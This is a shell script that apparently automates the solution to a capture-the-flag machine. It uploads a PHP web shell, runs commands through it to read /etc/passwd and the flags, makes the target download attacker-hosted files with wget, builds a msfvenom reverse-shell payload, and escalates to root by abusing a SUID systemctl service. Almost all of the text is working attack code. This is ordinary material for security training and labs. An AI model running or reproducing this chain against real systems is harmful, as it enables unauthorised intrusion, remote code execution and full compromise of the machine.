#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.255.87"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
#nmap -p- -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt

echo "2 - LOCATING DIRECTORIES USING GOBUSTER"
#gobuster dir -u http://$target_ip:3333 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/gobuster-results.txt

echo "3 - COMPROMISE THE WEBSERVER"
cp $scriptpath/../../tools/shell.php $result_folder/shell.phtml
curl -s -X POST "http://$target_ip:3333/internal/index.php" -L -F "file=@$result_folder/shell.phtml" -o /dev/null
#curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=cat+%2Fetc%2Fpasswd -o $result_folder/etc-passwd.txt
USER=$(cat $result_folder/etc-passwd.txt | tail -4 | head -1 | sed -n 's/\(.*\):x:1000:1000.*/\1/p')
echo "--> The user is '$USER'"
#curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=cat+%2Fhome%2F$USER%2Fuser.txt -o $result_folder/user.txt
FLAG=$(cat $result_folder/user.txt | tail -4 | head -1)
echo "--> The flag is '$FLAG'"

echo "4 - PRIVILEGE ESCALATION"
echo "#!/bin/sh" > $result_folder/temp.sh
echo "install -m =xs \$(which systemctl) ." >> $result_folder/temp.sh
echo "TF=\$(mktemp).service" >> $result_folder/temp.sh
echo "echo '[Service]" >> $result_folder/temp.sh
echo "Type=oneshot" >> $result_folder/temp.sh
echo "ExecStart=/bin/sh -c \"cat /root/root.txt > /tmp/gniark\"" >> $result_folder/temp.sh
echo "[Install]" >> $result_folder/temp.sh
echo "WantedBy=multi-user.target' > \$TF" >> $result_folder/temp.sh
echo "systemctl link \$TF" >> $result_folder/temp.sh
echo "systemctl enable --now \$TF" >> $result_folder/temp.sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=4444 -f elf -o $result_folder/shell.elf
cp $scriptpath/../../tools/LinEnum.sh $result_folder/LinEnum.sh
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=rm+LinEnum.sh -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=rm+shell.elf -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=rm+temp.sh -o /dev/null
python3 -m http.server 4444 -d $result_folder &
PID=$!
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=wget+http%3A%2F%2F$attack_ip%3A4444%2FLinEnum.sh -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=wget+http%3A%2F%2F$attack_ip%3A4444%2Fshell.elf -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=wget+http%3A%2F%2F$attack_ip%3A4444%2Ftemp.sh -o /dev/null
kill -9 $PID
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=chmod+%2Bx+LinEnum.sh -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=chmod+%2Bx+shell.elf -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=chmod+%2Bx+temp.sh -o /dev/null
#curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=./LinEnum.sh -o $result_folder/linenum.txt
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=./temp.sh -o /dev/null
curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=cat+/tmp/gniark -o $result_folder/root.txt
#xterm -hold -e "nc -lvnp 4444" &
#PID=$!
#curl -s -X GET http://$target_ip:3333/internal/uploads/shell.phtml?command=.%2Fshell.elf -o /dev/null
#kill -9 $PID
FLAG=$(sed -n '/<pre>/,/<\/pre>/p' "$result_folder/root.txt" | sed 's/<pre>//g; s/<\/pre>//g' | tr -d '\n' | tr -d '\r\n')
echo "--> The root flag is '$FLAG'"